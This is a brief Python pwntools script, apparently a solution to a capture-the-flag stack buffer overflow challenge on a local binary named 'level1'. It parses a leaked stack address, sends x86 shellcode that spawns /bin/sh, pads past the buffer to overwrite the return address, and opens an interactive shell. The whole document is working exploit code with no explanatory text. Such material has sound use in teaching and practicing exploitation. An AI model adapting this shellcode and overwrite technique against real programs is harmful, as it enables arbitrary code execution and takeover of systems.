from pwn import *

p = process("./level1")
s = p.readline()
padding = 0x88+4
addr = p32(int(s[len("What's this:"):-2],16))

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

payload = shellcode 
payload += 'A'*(padding-len(shellcode))
payload += addr

p.send(payload)

p.interactive()
